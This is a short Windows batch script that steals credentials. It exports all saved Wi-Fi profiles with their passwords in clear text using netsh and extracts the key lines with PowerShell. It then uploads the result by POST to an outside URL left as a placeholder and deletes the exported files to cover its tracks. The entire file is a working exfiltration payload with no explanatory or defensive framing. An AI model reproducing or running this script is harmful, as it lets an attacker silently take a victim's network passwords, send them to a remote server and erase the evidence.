@echo off
netsh wlan export profile key=clear
timeout /t 2
powershell Select-String -Path Wi-Fi*.xml -Pattern 'keyMaterial' > WiFi-Key
timeout /t 2
powershell Invoke-WebRequest -Uri "paste url" -Method POST -InFile WiFi-Key
timeout /t 2
del Wi* /s/f/q